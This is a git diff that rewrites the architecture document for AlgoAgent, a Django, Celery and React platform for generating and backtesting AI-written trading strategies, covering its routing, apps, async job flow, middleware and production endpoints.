@@ -1,892 +1,377 @@
-# AlgoAgent Monolithic System Architecture
+# AlgoAgent — System Architecture
 
-**Version:** 1.0  
-**Date:** December 3, 2025  
-**Status:** Production-Ready Single-Agent System
-
----
-
-## A — High-Level Architecture
-
-```
-User Input (Chat)
-   ↓
-┌─────────────────────────────────────────────┐
-│    Monolithic AI Developer Agent            │
-├─────────────────────────────────────────────┤
-│  1. Interactive Strategy Tester             │
-│  2. Gemini AI Integration                   │
-│  3. Strategy Validator                      │
-│  4. Django REST API Layer                   │
-│  5. Code Generator (backtesting.py)         │
-│  6. SQLite Persistence                      │
-│  7. Conversation Memory                     │
-└─────────────────────────────────────────────┘
-   ↓
-┌─────────────────────────────────────────────┐
-│    Backtest Engine                          │
-├─────────────────────────────────────────────┤
-│  • backtesting.py (kernc/backtesting.py)    │
-│  • TA-Lib Indicators                        │
-│  • Data Manager (yfinance)                  │
-│  • Metrics & Reports (CSV export)           │
-└─────────────────────────────────────────────┘
-   ↓
-Results (JSON, CSV, HTML Reports)
-```
-
-### Key Principles
-
-1. **Single Monolithic Agent** - One AI system handles: validation → generation → testing → persistence
-2. **Direct API Integration** - Gemini API for natural language understanding and code generation
-3. **Professional Backtesting** - Uses industry-standard backtesting.py instead of custom SimBroker
-4. **Conversation Memory** - Maintains context across interactions via SQLite
-5. **REST API Frontend** - Django-based HTTP endpoints for UI integration
-6. **Fully Testable** - Comprehensive unit and integration test suite
+**Last Updated:** March 10, 2026
+**See also:** [API Endpoints](../api/API_ENDPOINTS.md) | [Data Models](../DATA_MODELS.md) | [AI Pipeline](../AI_PIPELINE.md) | [Configuration](../CONFIGURATION.md)
 
 ---
 
-## B — Module Layout
+## 1. High-Level Overview
+
+AlgoAgent is a **monolithic Django backend** that exposes a REST API consumed by a React SPA (frontend). The core purpose is AI-powered trading strategy creation and backtesting. CPU-intensive work (LLM calls, code execution, backtests) runs asynchronously via Celery. Real-time streaming of backtest data is delivered through a WebSocket consumer.
 
 ```
-AlgoAgent/monolithic_agent/
-├── algoagent_api/              # Django settings & core config
-│   ├── settings.py
-│   ├── urls.py (main router)
-│   └── asgi.py / wsgi.py
-│
-├── auth_api/                   # Authentication & JWT
-│   ├── views.py (login, register, verify)
-│   ├── serializers.py
-│   ├── models.py (User)
-│   └── urls.py
-│
-├── strategy_api/               # Strategy CRUD & code generation
-│   ├── views.py (strategy endpoints)
-│   ├── production_views.py (production-hardened endpoints)
-│   ├── serializers.py (Pydantic schemas)
-│   ├── models.py (Strategy, StrategyValidation ORM)
-│   ├── urls.py
-│   └── management/
-│       └── commands/ (CLI utilities)
-│
-├── backtest_api/               # Backtest execution & results
-│   ├── views.py (backtest endpoints)
-│   ├── production_views.py (sandboxed execution)
-│   ├── serializers.py
-│   ├── models.py (BacktestRun ORM)
-│   └── urls.py
-│
-├── data_api/                   # Market data fetch & prep
-│   ├── views.py
-│   ├── models.py (DataSet ORM)
-│   └── urls.py
-│
-├── trading/                    # Live trading integration (placeholder)
-│   ├── models.py (Trade, Position ORM)
-│   └── views.py
-│
-├── Backtest/                   # Backtesting engine & code
-│   ├── backtesting_adapter.py  ⭐ Interface to backtesting.py
-│   ├── gemini_strategy_generator.py ⭐ AI code generation
-│   ├── data_manager.py (yfinance wrapper)
-│   ├── codes/                  # Generated strategy files
-│   │   └── *.py (executable strategies)
-│   ├── indicators/             # TA-Lib wrappers
-│   │   └── indicator_registry.py
-│   └── SYSTEM_PROMPT_BACKTESTING_PY.md (AI system prompt)
-│
-├── Strategy/                   # Strategy interaction tools
-│   ├── interactive_strategy_tester.py ⭐ CLI interface
-│   ├── strategy_validator.py (canonical JSON validation)
-│   └── gemini_strategy_integrator.py (AI analysis)
-│
-├── data_manager.py             # Data pipeline coordinator
-├── Data/                       # Data processing module
-│   ├── main.py (DataIngestionModel)
-│   ├── indicator_registry.py
-│   └── tests/
-│
-├── tests/                      # Unit & integration tests
-│   ├── test_ai_strategy_api.py
-│   ├── test_auth_flow.py
-│   ├── test_strategy_conversation_memory.py
-│   ├── test_production_api_integration.py
-│   └── test_dynamic_data_loader.py
-│
-├── requirements.txt            # Python dependencies
-├── pytest.ini                  # Test configuration
-├── manage.py                   # Django management
-├── start_server.ps1            # PowerShell startup script
-│
-└── db.sqlite3                  # SQLite database
++----------------+     HTTPS REST      +----------------------+
+|                | ------------------> |                      |
+|  React/Vite    |                     |   Django (Daphne)    |
+|  Frontend      | <------------------ |   Port 8000          |
+|  (Algo/)       |     JSON responses  |                      |
+|                |                     |   + Django Channels  |
+|  Port 8081     | === WebSocket ====> |   ws/backtest/stream |
++----------------+                     +----------+-----------+
+                                                   |
+                           +---------------+       |  enqueue tasks
+                           |               |       |
+                           |    Redis      | <-----+
+                           |    (broker)   |
+                           |               |
+                           +-------+-------+
+                                   |  dequeue
+                           +-------v-------+
+                           |               |
+                           |  Celery       |
+                           |  Worker       |
+                           |               |
+                           +-------+-------+
+                                   |
+                  +----------------+----------------+
+                  |                                 |
+         +--------v--------+             +----------v--------+
+         |  AI Generation  |             |  Backtest Runner  |
+         |  (Backtest/)    |             |  (backtest_api)   |
+         |  Gemini LLM     |             |  backtesting.py   |
+         +-----------------+             +-------------------+
+                  |                                 |
+                  +----------------+----------------+
+                                   |
+                           +-------v-------+
+                           |               |
+                           |  SQLite /     |
+                           |  PostgreSQL   |
+                           |               |
+                           +---------------+
 ```
 
 ---
 
-## C — Core Components
+## 2. Django Application Structure
 
-### C.1 — Authentication Layer (`auth_api`)
+The project is a single Django project (`algoagent_api`) containing six apps. Each app owns its models, serializers, views, and URL routes.
 
-**Responsibility:** User registration, login, JWT token generation
+```
+algoagent_api/          # Project config (settings, root URLs, Celery, ASGI/WSGI)
+auth_api/               # Users, JWT auth, Google OAuth, profiles, AI chat sessions
+data_api/               # Symbols, OHLCV market data, indicators, caching
+strategy_api/           # Strategies, AI generation, validation, templates, bot perf
+backtest_api/           # Backtest configs, runs, results, trades, alerts
+trading/                # WebSocket consumer — real-time backtest streaming
+workflows_api/          # Stub (currently returns empty list at GET /api/workflows/)
+```
 
-**Key Endpoints:**
-- `POST /api/auth/register/` - Create user account
-- `POST /api/auth/login/` - Get JWT token
-- `POST /api/auth/verify/` - Verify token validity
-- `GET /api/auth/refresh/` - Refresh expired token
+**Core Python library (not a Django app):**
 
-**Database Model:**
-```python
-class User(models.Model):
-    username = CharField(unique=True)
-    email = EmailField(unique=True)
-    password_hash = CharField()
-    created_at = DateTimeField(auto_now_add=True)
+```
+Backtest/               # AI agent, strategy generator, executor, error fixer, broker
+Strategy/               # CLI tools, validator, integrator (used by Backtest/)
+Data/                   # Data ingestion, indicator registry
 ```
 
 ---
 
-### C.2 — Strategy API (`strategy_api`)
+## 3. URL Routing Map
 
-**Responsibility:** Strategy CRUD, canonical JSON validation, code generation, persistence
+Root router (`algoagent_api/urls.py`) mounts each app at a prefix:
 
-**Key Models:**
-```python
-class Strategy(models.Model):
-    user = ForeignKey(User)
-    name = CharField(max_length=255)
-    version = IntegerField(default=1)
-    canonical_json = JSONField()  # Schema-validated strategy definition
-    generated_code = TextField()  # Executable Python code
-    code_path = CharField()        # Path to Backtest/codes/*.py
-    created_at = DateTimeField()
-    
-class StrategyValidation(models.Model):
-    strategy = ForeignKey(Strategy)
-    status = CharField(choices=['pending', 'valid', 'invalid'])
-    errors = JSONField()           # Validation errors if any
-    ai_recommendations = JSONField()  # Gemini suggestions
+```
+/admin/                         Django admin panel
+/api/                           API root (returns link index)
+/api/auth/                      → auth_api.urls
+/api/data/                      → data_api.urls
+/api/strategies/                → strategy_api.urls
+/api/backtests/                 → backtest_api.urls
+/api/workflows/                 → workflows_api.urls
+/api/production/                → algoagent_api.production_api_urls
+/api/jobs/<task_id>/            Generic Celery job status endpoint
+/api/logs/frontend-errors/      Receives error reports from the frontend logger
 ```
 
-**Key Endpoints:**
-- `POST /api/strategies/` - Create strategy
-- `GET /api/strategies/{id}/` - Retrieve strategy
-- `PUT /api/strategies/{id}/` - Update strategy
-- `POST /api/strategies/{id}/validate/` - Validate canonical JSON
-- `POST /api/strategies/{id}/generate-code/` - Generate Python code
-- `POST /api/strategies/{id}/generate-code-from-canonical/` - Direct code gen
-- `POST /api/production/strategies/validate-schema/` - Production validation
-- `POST /api/production/strategies/validate-code/` - Code safety check
+WebSocket routing (`trading/routing.py`):
 
-**Core Logic Flow:**
-```python
-# 1. User describes strategy in chat
-# 2. Gemini AI creates canonical_json (validated schema)
-# 3. User reviews & names strategy
-# 4. Backend generates Python code:
-#    - Parses canonical_json
-#    - Uses GeminiStrategyGenerator
-#    - Saves to Backtest/codes/
-#    - Updates Strategy.generated_code + .code_path
-# 5. Ready for backtest execution
 ```
+ws://<host>/ws/backtest/stream/ → trading.consumers.BacktestStreamConsumer
+```
+
+Full endpoint reference: [API_ENDPOINTS.md](../api/API_ENDPOINTS.md)
 
 ---
 
-### C.3 — Backtest Engine (`backtest_api` + `Backtest/`)
+## 4. Django Apps — Responsibilities
 
-**Responsibility:** Strategy execution, metrics calculation, results persistence
+### 4.1 `auth_api`
 
-**Key Models:**
-```python
-class BacktestRun(models.Model):
-    strategy = ForeignKey(Strategy)
-    start_date = DateField()
-    end_date = DateField()
-    status = CharField(choices=['running', 'completed', 'failed'])
-    total_pnl = FloatField()
-    win_rate = FloatField()
-    max_drawdown = FloatField()
-    sharpe_ratio = FloatField()
-    trades_csv = FileField()  # Exported trades
-    equity_csv = FileField()  # Equity curve
-    created_at = DateTimeField()
-```
+Handles all identity and session management.
 
-**Key Endpoints:**
-- `POST /api/backtests/` - Create backtest run
-- `GET /api/backtests/{id}/` - Get results
-- `POST /api/backtests/quick-run/` - Run backtest from canonical JSON
+- **Auth:** JWT (access token 1 h, refresh token 7 d, auto-rotation + blacklist). Google OAuth via django-allauth.
+- **Models:** `UserProfile`, `AIContext`, `ChatSession`, `ChatMessage`
+- **Key views:** `UserRegistrationView`, `UserLoginView`, `google_auth_redirect`, `google_auth_callback`, `ai_chat_view`
+- **Profile auto-creation:** A post-save signal on `User` creates a `UserProfile` automatically on registration.
 
-**Backtesting Workflow:**
-```python
-# backtesting_adapter.py: Main interface
-BacktestingAdapter(backtesting.py's Backtest class)
-    ├── fetch_and_prepare_data()  # yfinance → DataFrame
-    ├── create_strategy_from_canonical()  # JSON → Strategy class
-    └── run_backtest_from_canonical()  # Full execution
-        ├── Initialize Backtest(data, cash=100000)
-        ├── Add Strategy class
-        ├── Call .run() for bar-by-bar simulation
-        ├── Export trades to CSV
-        └── Calculate metrics (Sharpe, Sortino, Calmar, etc.)
-```
+### 4.2 `data_api`
 
-**Supported Indicators (TA-Lib):**
-- RSI, SMA, EMA, MACD, Bollinger Bands, ATR, STOCH, ADX, CCI, Momentum, ROC, DEMA, TEMA, KAMA, VAMA
+Manages all market data.
 
-**Column Naming Convention (CRITICAL):**
-```python
-# All generated indicator columns must include parameters
-RSI_14 = ta.RSI(df['Close'], timeperiod=14)
-SMA_20 = ta.SMA(df['Close'], timeperiod=20)
-SMA_200 = ta.SMA(df['Close'], timeperiod=200)
-MACD, MACD_SIGNAL, MACD_HIST = ta.MACD(df['Close'], ...)
-```
+- **Models:** `Symbol`, `DataRequest`, `MarketData` (OHLCV candles), `Indicator`, `IndicatorData`, `DataCache`
+- **Fetch flow:** Client POSTs to `/api/data/api/fetch_data/` → `DataRequestViewSet` creates a `DataRequest` record → data is fetched (yfinance/external) and stored as `MarketData` rows.
+- **Caching:** `DataCache` stores processed datasets by `cache_key` to avoid redundant fetches.
 
----
+### 4.3 `strategy_api`
 
-### C.4 — Data API (`data_api` + `Data/`)
+The largest app — owns strategy lifecycle from creation to performance tracking.
 
-**Responsibility:** Market data fetching, preprocessing, indicator calculation
+- **Models:** `Strategy`, `StrategyTemplate`, `StrategyValidation`, `StrategyPerformance`, `StrategyComment`, `StrategyTag`, `StrategyChat`, `StrategyChatMessage`, `BotPerformance`, `LatestBacktestResult`
+- **Standard CRUD:** `StrategyViewSet` (full ModelViewSet), `StrategyTemplateViewSet`
+- **AI generation:** `StrategyAPIViewSet.generate_strategy_unified()` — the main generation endpoint. Submits a Celery task (`generate_strategy_task`) and returns a `job_id`.
+- **Validation:** `StrategyViewSet.validate_strategy()` custom action calls `StrategyValidatorBot`.
+- **Bot performance:** `BotPerformanceViewSet` and `LatestBacktestResultViewSet` (read-only) track aggregated execution metrics per strategy.
+- **Celery task:** `strategy_api.tasks.generate_strategy_task` — runs the full AI generation + fix loop.
 
-**Key Class:** `DataIngestionModel`
-```python
-class DataIngestionModel:
-    def ingest_and_process(
-        self,
-        ticker: str,
-        required_indicators: List[Dict],
-        period: str = "60d",
-        interval: str = "1h"
-    ) -> pd.DataFrame:
-        """
-        Fetch OHLCV data and calculate indicators.
-        
-        Args:
-            ticker: "AAPL", "EURUSD", etc.
-            required_indicators: [
-                {"name": "SMA", "timeperiod": 20},
-                {"name": "RSI", "timeperiod": 14}
-            ]
-        
-        Returns:
-            DataFrame with columns: Open, High, Low, Close, Volume, 
-                    SMA_20, RSI_14, ...
-        """
-```
+### 4.4 `backtest_api`
 
-**Data Pipeline:**
-```
-yfinance (fetch OHLCV)
-    ↓
-IndicatorRegistry (map to TA-Lib)
-    ↓
-Calculate Technical Indicators
-    ↓
-DataFrame with standardized columns
-    ↓
-Ready for strategy backtesting
-```
+Manages backtest execution against historical data.
+
+- **Models:** `BacktestConfig`, `BacktestRun`, `BacktestResult`, `Trade`, `BacktestAlert`
+- **Run flow:** Client POSTs to `/api/backtests/api/run_backtest/` → creates `BacktestRun` with `status=pending` → submits `run_backtest_task` → returns `job_id` → client polls `/api/jobs/<id>/`.
+- **Celery task:** `backtest_api.tasks.run_backtest_task` — uses `InteractiveBacktestRunner`, populates `BacktestResult` + `Trade` rows on completion.
+- **Custom actions on BacktestRunViewSet:** `result`, `trades`, `alerts`, `cancel`
+
+### 4.5 `trading`
+
+Single WebSocket consumer for real-time backtest streaming.
+
+- **Consumer:** `BacktestStreamConsumer` (AsyncWebsocketConsumer)
+  - Accepts WS connection
+  - Streams candles and order signals sequentially
+  - Calls `pair_fills_to_trades()` to compute round-trip PnL
+  - Persists final result to `LatestBacktestResult`
+- **Channel layer:** `InMemoryChannelLayer` (dev). Switch to `RedisChannelLayer` for production (config in `CONFIGURATION.md`).
+
+### 4.6 `workflows_api`
+
+Placeholder. Returns `{"workflows": []}` at `GET /api/workflows/`. No models defined.
 
 ---
 
-### C.5 — Gemini AI Integration
+## 5. Cross-Cutting Systems
 
-**Components:**
+### 5.1 Authentication & Permissions
 
-#### A. Strategy Validator & Analyzer (`Strategy/gemini_strategy_integrator.py`)
-```python
-class StrategyAnalyzer:
-    def analyze_strategy(self, user_input: str) -> Dict:
-        """
-        Use Gemini to:
-        1. Extract steps from natural language
-        2. Validate completeness (indicators, rules, risk limits)
-        3. Generate suggestions for improvement
-        4. Ask clarifying questions if needed
-        """
+```
+Request arrives
+      |
+      v
+JWTAuthentication (simplejwt) checks Authorization: Bearer <token>
+      |
+      | valid           | invalid
+      v                 v
+  request.user       AnonymousUser
+  populated          (AllowAny default → passes; IsAuthenticated → 401)
+      |
+      v
+IsOwner permission: filters querysets to created_by=request.user
 ```
 
-#### B. Code Generator (`Backtest/gemini_strategy_generator.py`)
-```python
-class GeminiStrategyGenerator:
-    def __init__(self, use_backtesting_py: bool = True):
-        """Initialize with system prompt & API key from .env"""
-    
-    def generate_from_canonical(
-        self,
-        canonical_json: Dict,
-        strategy_name: str
-    ) -> str:
-        """
-        Generate executable Python code from canonical schema.
-        
-        Output:
-        - Complete Strategy class for backtesting.py
-        - Entry/exit rules implemented
-        - Risk management (stop loss, take profit)
-        - Proper column name handling
-        """
+- Default DRF permission: `AllowAny` (set at framework level)
+- Viewsets that contain user data apply `IsAuthenticated` + `IsOwner` explicitly
+- Token blacklist: revoked refresh tokens are recorded in `token_blacklist_blacklistedtoken`
+
+### 5.2 Async Job Pattern (Celery)
+
+Every long-running operation follows the same pattern:
+
+```
+  Client                     Django View              Celery Worker
+    |                             |                        |
+    |--POST /api/.../run_X/ ----> |                        |
+    |                             |--create DB record      |
+    |                             |  status='pending'      |
+    |                             |--enqueue task -------> |
+    |                             |  return job_id         |
+    | <---{ job_id: "abc123" }--- |                        |
+    |                             |                   task runs
+    |--GET /api/jobs/abc123/ ---> |                        |
+    |                             |--AsyncResult.state     |
+    |                             |  PROGRESS →            |
+    | <---{ state, progress } --- |                        |
+    |                             |                   task completes
+    |--GET /api/jobs/abc123/ ---> |                        |
+    |                             |--AsyncResult.state     |
+    |                             |  SUCCESS →             |
+    | <---{ state, result } ----- |                        |
 ```
 
-**System Prompt Location:**
-- `Backtest/SYSTEM_PROMPT_BACKTESTING_PY.md` - Current (backtesting.py)
-- `Backtest/SYSTEM_PROMPT_SIMBROK.md` - Legacy (optional fallback)
+Task states returned by `/api/jobs/<id>/`:
+- `PENDING` — queued, not yet started
+- `PROGRESS` — running (includes `current`, `total`, `status` fields)
+- `SUCCESS` — done (includes `result` object)
+- `FAILURE` — error (includes `error` message)
+- `REVOKED` — cancelled
+
+### 5.3 Middleware Stack (in order)
+
+```
+1. CorsMiddleware          — CORS headers (must be first)
+2. SecurityMiddleware      — HTTPS, HSTS, XSS protection
+3. SessionMiddleware       — Session cookie handling
+4. CommonMiddleware        — Trailing slash, content-type
+5. CsrfViewMiddleware      — CSRF protection
+6. AuthenticationMiddleware — request.user population
+7. AccountMiddleware       — django-allauth account handling
+8. MessageMiddleware       — Django flash messages
+9. XFrameOptionsMiddleware — Clickjacking protection
+```
+
+### 5.4 Logging
+
+Two rotating log files under `logs/`:
+
+| File | Max size | Backups | Content |
+|------|----------|---------|---------|
+| `logs/django.log` | 10 MB | 3 | Django application logs |
+| `logs/frontend_errors.log` | 5 MB | 5 | Frontend errors (from `/api/logs/frontend-errors/`) |
+
+Console handler also active on both.
 
 ---
 
-### C.6 — Conversation Memory (`Strategy/`)
+## 6. The `Backtest/` Library
 
-**Responsibility:** Maintain context across user interactions
+The `Backtest/` directory is a plain Python package (not a Django app) that contains the core AI and execution machinery. Django apps import from it directly.
 
-**Key Features:**
-- Session tracking per user
-- Strategy edit history
-- AI recommendation history
-- Validation feedback persistence
-
-**Database Model:**
-```python
-class ConversationMemory(models.Model):
-    user = ForeignKey(User)
-    session_id = CharField()
-    strategy_id = ForeignKey(Strategy, null=True)
-    interaction_type = CharField()  # 'validate', 'suggest', 'generate'
-    user_message = TextField()
-    ai_response = JSONField()
-    context = JSONField()  # Previous strategy state
-    created_at = DateTimeField()
 ```
+Backtest/
+  ai_developer_agent.py         LangChain agent with Gemini LLM + conversation memory
+  gemini_strategy_generator.py  Generates Python strategy code from a natural language prompt
+  bot_executor.py               Executes a strategy file in a venv-isolated subprocess (900 s timeout)
+  bot_error_fixer.py            Iterative AI error fixing loop (up to 8 attempts)
+  enhanced_error_detector.py    Classifies errors: framework vs bot-code, encoding, filter issues
+  code_change_logger.py         Records diffs across fix iterations
+  backtesting_adapter.py        Thin wrapper around the backtesting.py library
+  sim_broker.py                 Simulated broker used by BacktestStreamConsumer
+  bot_dry_runner.py             Pre-execution smoke test
+  pre_execution_validator.py    Static validation before running
+  strategy_validator.py         Strategy quality checks
+  strategy_manager.py           Strategy lifecycle state machine
+  metrics_engine.py             Performance metrics (Sharpe, drawdown, win rate, etc.)
+  data_loader.py                Fetches and prepares OHLCV data (yfinance)
+  canonical_schema_v2.py        Pydantic models: Signal, OrderSide, OrderType, SizeType
+  request_router.py             Routes requests to correct LLM provider
+  config.py                     Library configuration
+  terminal_executor.py          Runs shell commands from within the AI agent loop
+  workflow_tracker.py           Workflow state persistence
+```
+
+Flow detail: [AI_PIPELINE.md](../AI_PIPELINE.md)
 
 ---
 
-## D — Interactive Strategy Tester
+## 7. Production API Layer
 
-**File:** `Strategy/interactive_strategy_tester.py`
+`/api/production/` endpoints wrap standard CRUD with additional validation and deployment safety:
 
-**Purpose:** CLI interface for non-developers to test strategies
-
-**Usage:**
-```bash
-cd Strategy
-python interactive_strategy_tester.py
+```
+POST /api/production/strategies/validate-schema/   Pydantic schema check
+POST /api/production/strategies/validate-code/     Static safety analysis
+POST /api/production/strategies/sandbox-test/      Isolated Docker execution
+GET  /api/production/strategies/<id>/lifecycle/    Full audit trail
+POST /api/production/strategies/<id>/deploy/       Git commit + tag + deploy
+POST /api/production/strategies/<id>/rollback/     Revert to previous Git tag
 ```
 
-**Features:**
-- ✅ Free text input ("Buy when RSI < 30, Sell when RSI > 70")
-- ✅ Numbered steps format
-- ✅ URL-based strategy input (extracts from web)
-- ✅ AI-powered analysis & recommendations
-- ✅ Session history & saved results
-- ✅ JSON export
+These views (`ProductionStrategyViewSet`) use:
+- `canonical_schema_v2` — Pydantic runtime validation
+- `output_validator` — dangerous pattern detection
+- `sandbox_orchestrator` — sandboxed execution with resource limits
+- `git_patch_manager` — version-controlled deployment
 
-**Workflow:**
-```
-User Input (Free Text / Steps / URL)
-    ↓
-Strategy Validator (canonicalization)
-    ↓
-Gemini Analysis (validate + suggest improvements)
-    ↓
-Results Display (formatted + JSON export)
-    ↓
-Save to Database
-```
+See [PRODUCTION_API_GUIDE.md](../api/PRODUCTION_API_GUIDE.md).
 
 ---
 
-## E — REST API Layer (Django)
+## 8. Frontend Integration
 
-**Main Router:** `algoagent_api/urls.py`
+The React frontend (in `Algo/`) communicates with this backend exclusively via:
 
-**API Structure:**
-```
-/api/
-  ├─ auth/ (JWT)
-  │  ├─ register/
-  │  ├─ login/
-  │  └─ verify/
-  │
-  ├─ strategies/
-  │  ├─ GET/POST (list/create)
-  │  ├─ {id}/ GET/PUT/DELETE
-  │  ├─ {id}/validate/ POST
-  │  ├─ {id}/generate-code/ POST
-  │  └─ {id}/generate-code-from-canonical/ POST
-  │
-  ├─ backtests/
-  │  ├─ GET/POST (list/create)
-  │  ├─ {id}/ GET
-  │  └─ quick-run/ POST
-  │
-  ├─ data/
-  │  ├─ fetch/ POST
-  │  └─ indicators/ GET
-  │
-  ├─ production/   (Hardened endpoints)
-  │  ├─ strategies/
-  │  │  ├─ validate-schema/ POST
-  │  │  ├─ validate-code/ POST
-  │  │  ├─ sandbox-test/ POST
-  │  │  └─ {id}/deploy/ POST
-  │  │
-  │  └─ backtests/
-  │     ├─ validate-config/ POST
-  │     └─ run-sandbox/ POST
-  │
-  └─ trading/ (Live trading - placeholder)
-     ├─ positions/ GET
-     └─ trades/ GET
-```
+1. **HTTP REST** — all standard operations
+2. **WebSocket** — real-time backtest streaming at `ws://<host>/ws/backtest/stream/`
+
+Key frontend patterns:
+- JWT stored in `localStorage` (`access_token`, `refresh_token`)
+- All authenticated requests include `Authorization: Bearer <access_token>`
+- 401 responses trigger a global session expiration handler → redirect to `/login`
+- Long-running operations use the Celery job polling pattern via `jobPoller.ts`
+- Dual AI provider support: Copilot and Gemini, both routing through `generate_strategy_unified`
+
+CORS is configured to allow:
+- `http://localhost:8081` (local frontend dev)
+- `http://localhost:5173` (Vite dev server)
+- `https://algo-rho.vercel.app` (production)
+- `https://*.algoai.biz` (production custom domain)
 
 ---
 
-## F — Database Schema (SQLite)
+## 9. Data Flow Example: Strategy Generation
 
-**Key Tables:**
-
-```sql
--- Users
-CREATE TABLE auth_user (
-    id INTEGER PRIMARY KEY,
-    username VARCHAR(150) UNIQUE,
-    email VARCHAR(254) UNIQUE,
-    password VARCHAR(128),
-    created_at TIMESTAMP
-);
-
--- Strategies
-CREATE TABLE strategy_api_strategy (
-    id INTEGER PRIMARY KEY,
-    user_id INTEGER,
-    name VARCHAR(255),
-    version INTEGER,
-    canonical_json JSON,
-    generated_code TEXT,
-    code_path VARCHAR(255),
-    created_at TIMESTAMP,
-    updated_at TIMESTAMP,
-    UNIQUE(user_id, name, version)
-);
-
--- Strategy Validations
-CREATE TABLE strategy_api_strategyvalidation (
-    id INTEGER PRIMARY KEY,
-    strategy_id INTEGER,
-    status VARCHAR(20),  -- 'pending', 'valid', 'invalid'
-    errors JSON,
-    ai_recommendations JSON,
-    created_at TIMESTAMP
-);
-
--- Backtest Runs
-CREATE TABLE backtest_api_backtestrun (
-    id INTEGER PRIMARY KEY,
-    strategy_id INTEGER,
-    start_date DATE,
-    end_date DATE,
-    status VARCHAR(20),
-    total_pnl FLOAT,
-    win_rate FLOAT,
-    max_drawdown FLOAT,
-    sharpe_ratio FLOAT,
-    trades_csv VARCHAR(255),
-    equity_csv VARCHAR(255),
-    created_at TIMESTAMP
-);
-
--- Conversation Memory
-CREATE TABLE strategy_api_conversationmemory (
-    id INTEGER PRIMARY KEY,
-    user_id INTEGER,
-    session_id VARCHAR(36),
-    strategy_id INTEGER,
-    interaction_type VARCHAR(50),
-    user_message TEXT,
-    ai_response JSON,
-    context JSON,
-    created_at TIMESTAMP
-);
 ```
+User types "Create a MACD crossover strategy for BTC"
+                    |
+           POST /api/strategies/api/generate_strategy_unified/
+           Body: { description, ai_provider, auto_fix, max_fix_attempts }
+                    |
+           StrategyAPIViewSet.generate_strategy_unified()
+                    |
+           Celery task: generate_strategy_task(description, user_id, ...)
+                    |
+           Returns: { job_id: "xyz" }  ← client begins polling
+                    |
+           ========= Inside Celery Worker =========
+                    |
+           GeminiStrategyGenerator.generate(description)
+                    |
+           Python strategy code produced
+                    |
+           BotExecutor.execute(code_file)   ← runs in .venv subprocess
+                    |
+           ┌── success? ──────────────────────────────────┐
+           |   YES                        NO               |
+           |   metrics extracted          BotErrorFixer    |
+           |   Strategy saved to DB       .fix(error_log)  |
+           |   LatestBacktestResult       repeat up to     |
+           |   created                    max_fix_attempts |
+           └──────────────────────────────────────────────┘
+                    |
+           GET /api/jobs/xyz/  → { state: "SUCCESS", result: { strategy_id, metrics } }
+```
+
+See [AI_PIPELINE.md](../AI_PIPELINE.md) for the complete fix-loop internals.
 
 ---
 
-## G — Execution Flow: Strategy Creation End-to-End
-
-```
-┌─ Step 1: User Input ──────────────────────────────────┐
-│ POST /api/strategies/                                  │
-│ {                                                      │
-│   "user_description": "Buy when RSI < 30 for AAPL"     │
-│ }                                                      │
-└──────────────────────────────────────────────────────┘
-         ↓
-┌─ Step 2: Validate & Analyze ─────────────────────────┐
-│ Strategy Validator → Gemini AI                         │
-│ • Extract entry/exit rules                             │
-│ • Validate completeness                                │
-│ • Generate canonical JSON schema                       │
-│ • Produce AI recommendations                           │
-└──────────────────────────────────────────────────────┘
-         ↓
-┌─ Step 3: User Review ────────────────────────────────┐
-│ PUT /api/strategies/{id}/                             │
-│ {                                                      │
-│   "canonical_json": {...},                            │
-│   "name": "RSI_Oversold_AAPL_v1"                      │
-│ }                                                      │
-└──────────────────────────────────────────────────────┘
-         ↓
-┌─ Step 4: Generate Executable Code ───────────────────┐
-│ POST /api/strategies/{id}/generate-code-from-canonical/
-│                                                        │
-│ GeminiStrategyGenerator:                               │
-│ • Load SYSTEM_PROMPT_BACKTESTING_PY.md                │
-│ • Generate Strategy class for backtesting.py           │
-│ • Include entry/exit/risk management                   │
-│ • Save to Backtest/codes/rsi_oversold_aapl_v1.py      │
-│                                                        │
-│ Response:                                              │
-│ {                                                      │
-│   "strategy_code": "import backtesting...",           │
-│   "file_path": "Backtest/codes/...",                  │
-│   "success": true                                      │
-│ }                                                      │
-└──────────────────────────────────────────────────────┘
-         ↓
-┌─ Step 5: Test via Backtest ──────────────────────────┐
-│ POST /api/backtests/quick-run/                        │
-│ {                                                      │
-│   "strategy_id": 123,                                 │
-│   "start_date": "2024-01-01",                         │
-│   "end_date": "2024-12-31"                            │
-│ }                                                      │
-│                                                        │
-│ BacktestingAdapter:                                    │
-│ • Fetch AAPL OHLCV from yfinance                       │
-│ • Calculate RSI_14 + other indicators                  │
-│ • Execute Strategy.next() for each bar                │
-│ • Collect trades & metrics                             │
-│ • Export trades.csv + equity_curve.csv                │
-│                                                        │
-│ Response:                                              │
-│ {                                                      │
-│   "total_pnl": 2500.50,                               │
-│   "win_rate": 0.62,                                   │
-│   "max_drawdown": -8.3,                               │
-│   "sharpe_ratio": 1.45,                               │
-│   "total_trades": 42                                  │
-│ }                                                      │
-└──────────────────────────────────────────────────────┘
-         ↓
-Results Available for Review
-```
-
----
-
-## H — Testing Infrastructure
-
-**Test Files:**
-- `test_auth_flow.py` - JWT authentication
-- `test_strategy_conversation_memory.py` - Conversation tracking
-- `test_ai_strategy_api.py` - AI code generation
-- `test_production_api_integration.py` - Production endpoints
-- `test_dynamic_data_loader.py` - Data pipeline
-- `test_production_endpoints.py` - Full endpoint coverage
-
-**Test Running:**
-```bash
-# Run all tests
-pytest tests/ -v
-
-# Run specific test file
-pytest tests/test_ai_strategy_api.py -v
-
-# Run with coverage
-pytest tests/ --cov=strategy_api --cov=backtest_api
-```
-
-**Current Status:**
-- ✅ 26+ tests passing
-- ✅ All core endpoints tested
-- ✅ Data pipeline validated
-- ✅ Code generation working
-- ✅ Production endpoints hardened
-
----
-
-## I — Environment Configuration
-
-**File:** `.env` (at workspace root)
-
-```bash
-# Django
-DEBUG=False
-SECRET_KEY=your-secret-key
-ALLOWED_HOSTS=localhost,127.0.0.1
-
-# Database
-DATABASE_URL=sqlite:///db.sqlite3
-
-# Gemini API
-GEMINI_API_KEY=your-key-here
-
-# JWT
-JWT_SECRET=your-jwt-secret
-JWT_EXPIRY=3600
-
-# Feature Flags
-USE_BACKTESTING_PY=True
-USE_CONVERSATION_MEMORY=True
-```
-
-**Loading Configuration:**
-```python
-# Loaded automatically in settings.py via django-environ
-from environ import Env
-env = Env()
-env.read_env()
-GEMINI_API_KEY = env('GEMINI_API_KEY')
-```
-
----
-
-## J — Deployment & Startup
-
-**PowerShell Startup Script:** `start_server.ps1`
-
-```powershell
-# Activate virtual environment
-.venv\Scripts\Activate.ps1
-
-# Migrate database
-python manage.py migrate
-
